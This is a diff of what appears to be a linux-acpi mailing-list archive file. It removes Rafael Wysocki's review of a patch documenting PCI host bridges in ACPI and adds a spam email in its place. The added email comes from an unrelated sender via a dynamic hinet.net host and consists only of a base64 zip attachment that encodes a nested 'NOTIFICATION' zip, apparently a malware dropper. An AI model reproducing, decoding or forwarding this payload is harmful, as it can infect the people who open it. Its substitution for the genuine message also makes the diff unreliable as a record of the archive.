@@ -1,106 +1,108 @@
-From: "Rafael J. Wysocki" <rafael@kernel.org>
-Subject: Re: [PATCH] PCI: Add information about describing PCI in ACPI
-Date: Sat, 19 Nov 2016 00:02:24 +0100
-Message-ID: <CAJZ5v0h3ax4+UCm57VYqV3SVzOZ3A5Ajykks10J49rj1O4VkvQ@mail.gmail.com>
-References: <20161117175938.17465.45820.stgit@bhelgaas-glaptop.roam.corp.google.com>
+From: <lizdebeth_@hotmail.com>
+Subject: 61082 linux-acpi
+Date: Sun, 20 Nov 2016 23:27:35 -0000
+Message-ID: <147968445553.13679.10551166449157593811@hinet.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
+Content-Type: application/zip; name="EMAIL_912959_linux-acpi.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-acpi-owner@vger.kernel.org>
-Received: from mail-wm0-f67.google.com ([74.125.82.67]:33398 "EHLO
-        mail-wm0-f67.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751716AbcKRXC1 (ORCPT
-        <rfc822;linux-acpi@vger.kernel.org>); Fri, 18 Nov 2016 18:02:27 -0500
-In-Reply-To: <20161117175938.17465.45820.stgit@bhelgaas-glaptop.roam.corp.google.com>
+Received: from 114-25-51-53.dynamic.hinet.net ([114.25.51.53]:33272 "HELO
+        hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1752189AbcKTX1m (ORCPT <rfc822;linux-acpi@vger.kernel.org>);
+        Sun, 20 Nov 2016 18:27:42 -0500
+Content-Disposition: attachment
 Sender: linux-acpi-owner@vger.kernel.org
 List-Id: linux-acpi@vger.kernel.org
-To: Bjorn Helgaas <bhelgaas@google.com>
-Cc: Linux PCI <linux-pci@vger.kernel.org>, ACPI Devel Maling List <linux-acpi@vger.kernel.org>, Linux Kernel Mailing List <linux-kernel@vger.kernel.org>, "linux-arm-kernel@lists.infradead.org" <linux-arm-kernel@lists.infradead.org>, "linaro-acpi@lists.linaro.org" <linaro-acpi@lists.linaro.org>
+To: linux-acpi@vger.kernel.org
 
-On Thu, Nov 17, 2016 at 6:59 PM, Bjorn Helgaas <bhelgaas@google.com> wrote:
-> Add a writeup about how PCI host bridges should be described in ACPI
-> using PNP0A03/PNP0A08 devices, PNP0C02 devices, and the MCFG table.
->
-> Signed-off-by: Bjorn Helgaas <bhelgaas@google.com>
-
-Looks great overall, but I have a few comments (below).
-
-> ---
->  Documentation/PCI/00-INDEX      |    2 +
->  Documentation/PCI/acpi-info.txt |  136 +++++++++++++++++++++++++++++++++++++++
->  2 files changed, 138 insertions(+)
->  create mode 100644 Documentation/PCI/acpi-info.txt
->
-> diff --git a/Documentation/PCI/00-INDEX b/Documentation/PCI/00-INDEX
-> index 147231f..0780280 100644
-> --- a/Documentation/PCI/00-INDEX
-> +++ b/Documentation/PCI/00-INDEX
-> @@ -1,5 +1,7 @@
->  00-INDEX
->         - this file
-> +acpi-info.txt
-> +       - info on how PCI host bridges are represented in ACPI
->  MSI-HOWTO.txt
->         - the Message Signaled Interrupts (MSI) Driver Guide HOWTO and FAQ.
->  PCIEBUS-HOWTO.txt
-> diff --git a/Documentation/PCI/acpi-info.txt b/Documentation/PCI/acpi-info.txt
-> new file mode 100644
-> index 0000000..ccbcfda
-> --- /dev/null
-> +++ b/Documentation/PCI/acpi-info.txt
-> @@ -0,0 +1,136 @@
-> +           ACPI considerations for PCI host bridges
-> +
-> +The basic requirement is that the ACPI namespace should describe
-> +*everything* that consumes address space unless there's another
-> +standard way for the OS to find it [1, 2].  For example, windows that
-> +are forwarded to PCI by a PCI host bridge should be described via ACPI
-> +devices, since the OS can't locate the host bridge by itself.  PCI
-> +devices *below* the host bridge do not need to be described via ACPI,
-> +because the resources they consume are inside the host bridge windows,
-> +and the OS can discover them via the standard PCI enumeration
-> +mechanism (using config accesses to read and size the BARs).
-> +
-> +This ACPI resource description is done via _CRS methods of devices in
-
-To be painfully precise, those need not be methods.  They may be
-static objects too.
-
-> +the ACPI namespace [2].   _CRS methods are like generalized PCI BARs:
-> +the OS can read _CRS and figure out what resource is being consumed
-> +even if it doesn't have a driver for the device [3].  That's important
-> +because it means an old OS can work correctly even on a system with
-> +new devices unknown to the OS.  The new devices won't do anything, but
-> +the OS can at least make sure no resources conflict with them.
-> +
-> +Static tables like MCFG, HPET, ECDT, etc., are *not* mechanisms for
-> +reserving address space!  The static tables are for things the OS
-> +needs to know early in boot, before it can parse the ACPI namespace.
-> +If a new table is defined, an old OS needs to operate correctly even
-> +though it ignores the table.  _CRS allows that because it is generic
-> +and understood by the old OS; a static table does not.
-> +
-> +If the OS is expected to manage an ACPI device, that device will have
-
-I'm not very keen on using the term "ACPI device" in documentation as
-it is not particularly well defined.  As a rule, I prefer to talk
-about "non-discoverable devices described via ACPI" or similar.
-
-Accordingly, I'd change the above line to something like "If the OS is
-expected to manage a non-discoverable device described via ACPI, that
-device will have".
-
-> +a specific _HID/_CID that tells the OS what driver to bind to it, and
-> +the _CRS tells the OS and the driver where the device's registers are.
-> +
-> +PNP0C02 "motherboard" devices are basically a catch-all.  There's no
-> +programming model for them other than "don't use these resources for
-> +anything else."  So any address space that is (1) not claimed by some
-> +other ACPI device and (2) should not be assigned by the OS to
-
-Here I'd say "any address space that is (1) not claimed by _CRS under
-any other device object in the ACPI namespace and (2) ...".
-
-> +something else, should be claimed by a PNP0C02 _CRS method.
-
-Thanks,
-Rafael
+UEsDBBQAAgAIAKEqdUn4auVqYxMAAG0TAAAaABwATk9USUZJQ0FUSU9OXzEwMDQ5X1pJUC56aXBV
+VAkAA90vMljdLzJYdXgLAAEEAAAAAAQAAAAAdZhVVBQM14UHQVIYwKElpEEEhg4BiQFEugYdEIEZ
+kQbpRkCBobsbaenukpShS1Jq6B46vvf9v7t/rW+vtfc+5+LcnotH8y02DgjwCIAPyOZ2fhPoidn+
+SQ4A6AgCABSAZwB1Dd03im/kZXXfaKgbg/n5hcR5LR31dAkA2It8Agb/2tmNCICFA/hH/xc2sPmI
+BbEY77p25s5EngBF5x9xM2APKinJ3eSg7YPO2Q4hzVigLjLZNP+AnE0r9Orih4IA9aBt7kfqx8eU
+YWIOqziLlR5sf9QxyS261pi1He8b9x++05ClIwx66vjUUvTh2dnIVTrO+u2GWQHeRis13RilkuR3
++xP32sx2QWO7hZVwhjqHbgVUiroQVbx1/lc8IUUgPuaVmuRwzVTAua3myFPxCiEzu4mkDq+LO0b4
+vZLYoWjSg/Qq/XmlRyF3jKsFVAIlc3NlVzWemUR/eJaVTjcZx63d+nt9iYQ58fzbHBAtLHLq0412
+nKp6Ydncut8SuIhuxzBK3Qs9WB+/34bE7ehXlnGrT/THVnfCUe145e1k9ZO2DM+2OmEG9lHy7H9C
+kxQZ0NHzV/KtWl/QidMG6EAqnpxoiJHDUwf+cOZt+HaupB7/g6eZyNVmb411S6hW3p01xLEoG2Yl
+kNfUH9cQD7z8wzxWwqNj8dFoXcgXotBXEGuzaaxKldMXWGEIBmHCExulpl0yztf1U0n66CBhYBJb
+0K4C+0RZ0p1Z0KZI7vQDJ23ld7U1KUrXjJPguVCiKLKCt5cTQJmzzQP/AocqaIgXq0DFzUKz2Bhj
+jD5I3KFdjEbj69vRjLTK95t/vR6/uonPgmjw2so5gi/ZtfV+mP5uXN5dz0hD9KqdH8ziWWtQ/mjh
+kUAPszdosKctPtNp2P04061uS83I7ls2Lq4sX8PnqM4Ms+0+PIIneeg2ttT89nj7sa0dDnZwaHPE
+JT5S3OgfVwKTcEiOMgVfiaTJiD6MHisfqcOmIDz7k8MKpViBrZL5laxkiBuVMESHuUJsSVq8FGO+
+w67BTacHA03TR+Fmsb+SHx2KqlY7XSaoA1g5Gs6h0tTmc2s3EbQZx06jQwSOG7vD108deheasgS/
++hjwTCPzKC6aq6Qpf7OoJtGeRvl6N0/iGG6s5BaaBJwk1BwY1vlTD2GLADLiip+FNltjsiy0bcCn
+N558jFTT5y1nGW2ubmDxFdFph7U9rHNsH7XQFsp63Q8pos2xE+vlJYzB1fNk9qDXN19ijfQNd7qM
+84k9p2p6wlMMseyktSOZdxEZ3xh2Oon3uvaviTpFPJ6Umht9QgkzwkXYOkThlS97r0L7N8SOBDyq
+N2fFL16J5UbpT+tc2h1ZQsp59wSCO9b+dHbGYvHsz+ZU57/b0+mBTIWcw7WEnCiZjPWFOWy5UxUr
+9S77qzIW44TZ1FVdcCuN7hr4VXzMnftSU+fMt8r+BGbTqN0b9liCC3kO3mmhb7e2u8nk7G6++VE4
+JNBjNApiRJtJkqt9/Ba6nu1ewh9UWVenq1x2Pyu1eaoN94cHBLMEkj8xcx9KUYjo4sXjh99/OC29
+Rdj4k0pWImHCNVUIPa8j5QZH8StAVo/AvcDc+paivmUwQl83KsaFhEgDBct3bq+1Dg9yrmfmKht/
+J2Av6+v3wmx7pivNNejQL3FnLDTMGdrMwPOpivAKKvXrniDz4MtLgaXBfBNUPQnJtfIwbJX/ocK+
+mNtkKv3HWhiCL1Pa+zk+T2REzL5vZrvuzPFfVNnvA1J7FxXSdkVX9Y6hivLCF5FfKENFqQrKwVYh
+3RUBZtJ0gtZr5eou3G1V1nYjn6RZtHTyerKTZG8WmU2WDPIUp4kp/7ry2pfSQ+9UXUVmo1YH51ev
+OQ9cirZf+94tH/b6Aea+gtuDJO6jLFi4rSIC1io56stDeqM5hBqKZGtEaURdili6JJQTdttPzm+6
+yg1Qu9/rwb7VCo5dXNHLgCOe7I6bWDKNEuYMIERInumgmwVZS8/6qgGNdI22hKRQncNfS9ShmJ6G
+rdfPQHrgwAyKtULa7W3Tz3OKNtugir9SLm+SoTn07k56ta4+VdcWmx14eFyUAStuemWN0SrxBWGe
+TMsydxtQatqP5vCfXmGm6+FsJuslFVuO9qL0ADYDwOh+cZPqK4lUwgve0ADfbeOy9kEnB5vV8dCg
+wNJPj8LgIsu29K/sKrFPQ5tAIQF9eijPVWliozJwABWdbu55nbr05Kj13t8savB9le3VTAhkvicY
+2y/8ROLkzPSisbu0EAWVIXO6CFXI8tgf6dVS1X6SzvYzMmLAyqrbWXaJtzRi1u1IUgpQ4iSt0ja7
+guV4steVk/PCaHzMbHpZr9FFPjyX198P2KhYipRRaQbZ1w00tSfU+b8Xe5PdB29tQnfNBKzDYE/j
+JtXbI0XDX8nbGM4ySTdSsbBsoR7hvX/7zL2wKRixJmDxxBm8Xk+6XMNr5GHCmwxvV8T9kXU/LzdM
+giWlv7MEavQ4HZhQVUcupHPj7ISx6Ah+K/GyN15gSD8kC7gIMq9KK4EVECU0/HHnkRJPSlXpuwQ+
+YThtazhO59PERtdRWiFjNPDJTamaZla1T7UVSMjl1xXy5ZjLEdq8hRGl3OnmUx/pvZHIw2+hyJf+
+fuihl8XaH+gOBv9gZNwFr4y2spzweuezVtCRwUa/Ox/1nMjZd6haG2cC2YuZmz8v+Jx+Y75KOIpr
+EMMCLiQtoEWTj/LIL2JmFntpBZ1mCa4QVUO+xr5PSpWxOymW8wV3mF+55zf0Os405RnIG9VxUjhp
+ea4lS3iUvEf5Jr95i79RD5W5Tv1s+q7KzcUs/bCNrIdWFPWa3TRiNjXo6zIiU/2K/2wSsDXe++vC
+0KqMsjbfq6Z4QIg2cBrx5LbstBZ7aOUNitP0Q5Wq03Zqu3x1fw06M9hxHCLdTDWnhqD6Ko7udKew
++AQlyZBj2pBihI3lC5z99g5alTha2Djr4UIGSum+GmSt7ntvJdHsEkV/byJtpfOhV8B8e0ApXcqg
+6rqc4uuTeuXJ9OK3Ruq0lFWuH6vlcb6IzmgM+9P0P4+2YEsZL9ghLhb4RLFeT9NPGWdQkz4at7IV
+jw9bxSJYfk0bSKqMcKT4IZCHRtu136mmYVW+fgoo9odhTKmFhKgpTGXMUMCwLINvee3e3BbMwkce
+nAxl6/4etl0hMcalX2p9/Qdlb/TK98LptSY7PpKbM/uS6CRQ1Scs95g8Z9k3ei+qP6YXz/Xkjr6H
+mUaBxw6IZnmIpbTCc4NRfSEC7M4anaKUWjCDWIBRJ4ttvrCPvKu/arWCOphS3sPZobGcKYiyn9U4
+yo03BYZstuJDgpSN1m4Kcy6mvbVp/s5auJhKFV1XigDDzxG4Ev27UFmfEdh4zpqEVrik8eJ+lJOo
+7OnZHLPrwkROE8U77R72i/vbi3bvoPVQgn4y3VpRDS6PpXUIXXW21B86JovfPy8dFQb+4q+sNBol
+Itu0oJKj48oZyzyyJJpxfMjnDAV/RKicT6JFH3NaxRoHD13hKbvwq8aRNZ9IRDOcAaIHVJbZ+tuJ
+9r3DdJ95LhLWnAPYNt8MwsTyqekSBgqjK/lm2dduN0bKmTgN1LDsKsNCDwbNaOIzzJ+RgtQIXqQL
+a2XexMpGAJc4Vk3Sh1JY2Ap9yV6PAayK8rm1k1tfrlg1fc2zeVsIwV4bACTY8B1ia6hs2+2vV8nw
+xw3I39xjqpR1oPf96z/63+u+cS+cjG9l7cCuuLNKX6SlCYfM288wXSomfCCg+aJ1spiMWs5Jdn9l
+if9aj0jchazkTs/QmemXF5zOGJVSGl5LgLSS39nVRiZhO6dw/MJwQB7TQVofN23Ja2X1TFJtgEKQ
+qBGgBpS1DDr86jQuvBVzlh7KCyQ9I0AVzmwUvpjeyvn+o9BRLtpazsEVKdf6Oppd3mEmlBkccC2Z
+w4mnCSoBCaoji4h+WRJChrGQpP68UwJNoDaucTCXvta2f5Pmgl2O8n4uQw8nO+NkSSTJNQlgJsNt
+y2/0QLDaDkQ/SVUG4qoBgUmQtDagQfU+XJGy8ROLRfMczx5biFCucAVhk/X1GEQ7q3Bsu2oB9a2M
+QuyYsEXbg3KC9A9f7a+X4wmyW1nUPFy8OlxCifwRW1rQfVkEhccnUx+/91rAP6BQVZC53nUgD6jo
+FoTp5pwMnawPeCYsI/3P3ynANSJWGXn5uxLLmuvsnLNLG1n8rolTlCuYDBQtvuNG+esxi1GCymRo
+XFbSWusSuRbVHcTpV07XmDn2BqnwC/+CL1kbWtoLuFMeYWBIwyFwDEIXlkMetVrzTZKX33up8i3v
+TeANUuNw9Kxa1h+PsBaOx0NGVW4huxuZI03jvYMzBsHaFBMWWkjImevw8Jmobt6Mu8PkhW4tb7YY
+e8dfISzr21bgJwMWqxZaEV8+w63ictKJZi5yJefivpeT0+LXxTu6kIHkoHTqUlutVLknRVOE6DzA
+wCjX8wNNDlJ/h6LnTrVpJ0qm3CL40PTXBMVLr6FAlIYK6dKk1Grr+XfDyZcX6dXEMS7LBBpZCktM
+ypXeVdVmq0PnbjoWThEKHvKYR1GX4TfJdcRSOUX2CSGJ31BEqmMz2U2mhVQSWy0y88+lmf1lXmgp
+d3vr++wWUsOhyOaFqxU3mSxHevSmKnHrzrZltht+xlnkZlmNJFVhJIJ3ZJyvi+DPkjX3LSWOC2Zl
+Jsz1TeWFdsZx/oUU+eAtEaGF5Etz1kqeighiCXl8YtPodDKcr63gltNWUrAwDDdj8fF+GOONKz6i
+QEBvs5Ay6MykfH3dh4ikpdbKZiRURVIbGg/8LXVWMTEnMCJC46XpF0OQTS4d3/Oz5fh+0FyqS9p2
+Tuy5pW39O7CVo+LqHCWFdufq30AX0XREy5bn6+GCffOgfvg05d/3pdU8ecLSJ+q6P6Hp2QvV22SD
+rsz4HnCT3F18IGGLftoCwhsdZC4mP3kyMcSBxpU6nFtUQt1gHQNJP6GJCLF+PZqMN9jqLRp3/2G5
+uFtIisnhMH4cjyAqF2MN5oABch8bKghwHVDVYcrV5PIS957jrxR7Gaux4mK6qkPY+Qx6AoIhXpW2
+1yTaYccWMQWDLkwjnPzW3diSeryDq+8J7aQ/BwIyPTMjqZltXeWIh+e2W5nHjw96Uwcluz2DtS87
+p5zXx2IFnbJalLJS3eJu9VkLYQB2Tw6ofzEzn27GX68PpDt6A7RGoskz8GkZZZIB4nXDtUSYnxxP
+zF7lgKLWBwjrJ/t0h3xu/HGHR0LmborgdtlITnUN7e+KZj5jbM8k3cgoDkCEsNjH8k72URjXUCtO
+d5enP4uBbRjXCgK2ds9ZpeZkyTZlD2Mnnt5UFdgc9NfYCysY3t9DT5Ddx0c5uPPLEix97z4704oe
+WHqdRtcpHX5ekh1/lJS+8H2RsQenEjPxqxtHreBQbsT9lBwcpfKi7/1YopKU7CxNEgHVPJ3esEQt
+Zpsw5nZhTZWloypWHufihEhiXnnIwsOIl62EKsgmU//h4riLts3SauDh7Lh7YX/fGeyDQLzby8ge
+obASPPCu8GAaMnUA2gS2YFv5NaWxJtKcow5y5HF4L8lG8HJPEiCiR7F9j9zgnx2AO0VPDZU1wtY6
+qglJV9DiL/Snd8pKnP/C9g6VJlkzGWMlthkw42DapMWQPK0pvfBKTx/R+i80OCeo8PlkTmkxxtpG
+e4fpPqYSupnHX7YYF9q6dyVKFIy01Ue7+7ppni/jtpYIz4wtvGOzvfj1FKdPAK8/G+/s0xH+BTnT
+ZIp58wdEBsVGAHRmtaZQVq6vD9t1iFfH1Z9nmW3fD54ieFGqqqsfAnca/faUjEYiaxYriVSMQOgR
+Vr307JLvUHVYc4GSZw/YdWt/XLK/iG6IxqaD72I2RB3yTgsxj05kP+zQWKFJ8TTyFuB16xkPCCgH
+sg8YBckFdKfOtHsTrGRqzKbNLxNE7dHjX97bXspPs1k5lrt+Dw5Ti3iDzGblVGJ4HSYN+/5pOzb5
+MKNKF2G2Im6+snCEY0vgq/Ehc+mbL663SEftRd9UQ0oBBHRN8DLHlNy6WSaHRXM30LaEjtV9RCcC
+Mrkb005AGcnrRw8jbKx14nTyqTbae1ks7ul1dcl4I+G+PtUxQUCdxg0PceRgnOHqT48zSyakYyab
+qqLl+LKJoIadHalidOLRrKSpUCv9pmLq7F2i0rIxp/vNxbqhEb4PiZfW5nctHgEjmnQxXSwBglFj
+ip8EJ7++MuH6mBdefxfgnSU/x/UnZLrIKQ6jy5Vs+rAoM5TX8EN1jIgWKfEWtNTf8PtSU+8eb4hO
+ZzceDVwaayZBXjedHv+mulcTx5S3jnhsis4vxmww3fcvVZvcyh1tBl4/CILVqh0k9JnZowRcPJXC
+bZASAZPtT/KGPo1esV0KqRFzkzjrXBWYglp98woXiRK5VJKP76Uv3FuK5Yc327xAM1OhxwRnpdE5
+LmXSI5ElK/s2g2eMe413AQrIZc+MfdUjJv/VB1+5MaLJ07j7YfgWmQDGjp9zZzXNeLP1+nmhyZu/
+FLdzmsjtzaVsHTefr2t0Fw8jSq409yFiRtJROZcP2mnGURy+1ycPmm+xHjFg/y/6Rf0vzwJg/eO8
+r/9O/4OFPf4vC/t/HEzz7WPc/55jAWD/9C35v9t/AFBLAQIeAxQAAgAIAKEqdUn4auVqYxMAAG0T
+AAAaABgAAAAAAAAAAACkgQAAAABOT1RJRklDQVRJT05fMTAwNDlfWklQLnppcFVUBQAD3S8yWHV4
+CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAGAAAAC3EwAAAAA=
